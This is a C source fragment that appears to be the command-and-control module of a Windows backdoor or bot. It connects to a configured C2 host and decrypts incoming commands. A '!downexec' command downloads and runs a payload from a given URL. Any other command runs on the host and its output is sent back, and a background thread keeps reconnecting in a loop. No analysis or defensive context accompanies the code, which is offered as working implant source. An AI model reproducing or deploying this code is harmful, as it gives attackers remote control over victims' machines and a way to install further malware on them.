char *pre_parse(char *cmd_str) {
 char *output = malloc(1000000);
 memset(output, 0, 1000000);
 if(strncmp(cmd_str, "!downexec ", strlen("!downexec ")) == 0) {
  char *url = strstr(cmd_str, " ");
  if(!url) {
   free(output);
   return 0;
  }
  url += 1;
  #if debug==1
   printf("Download and executing: %s\n", url);
  #endif
  down_exec(url);
  sprintf(output, "Downloaded and executed.");
  return output;
 }
 free(output);
 return 0;	
}

int c2_comm() {
 char *inbuf;
 inbuf = malloc(1000000);
 memset(inbuf, 0, 1000000);
 int fd = socket(AF_INET, SOCK_STREAM, 0);
 struct sockaddr_in sa = {0};
 struct hostent *hname = gethostbyname(c2_host);
 if(!hname) return 0;
 memcpy(&sa.sin_addr, hname->h_addr_list[0], 4);
 sa.sin_port = htons(c2_port);
 sa.sin_family = AF_INET;
 if(connect(fd, (SOCKADDR *)&sa, sizeof(sa)) != -1) {
  while(1) {
   memset(inbuf, 0, 1000000);
   int szin = recv(fd, inbuf, 999999, 0);
   if(szin < 0) break;
   encrypt_decrypt(inbuf, szin);
   #if debug==1
   printf("%s\n", inbuf);
   #endif
   int szout = 0;
   char *preparsed = pre_parse(inbuf);
   if(preparsed != 0) {
   	int pplen = strlen(preparsed);
   	encrypt_decrypt(preparsed, pplen);
   	int sentpre = send(fd, preparsed, pplen, 0);
   	free(preparsed);
   	if(sentpre < 0) break;
   	continue;
   } else {
   	char *outbuf = exec_ret(inbuf, &szout);
   	encrypt_decrypt(outbuf, szout);
   	int sentout = send(fd, outbuf, szout, 0);
   	free(outbuf);
    if(sentout < 0) break;
   }
  }
 } 
 free(inbuf);
 closesocket(fd);
}

void c2_handler() {
 while(1) {
  c2_comm();
  sleep(delay);
 }
}

void initialize_c2() {
 CreateThread(0, 0, (LPTHREAD_START_ROUTINE)c2_handler, 0, 0, 0);
}
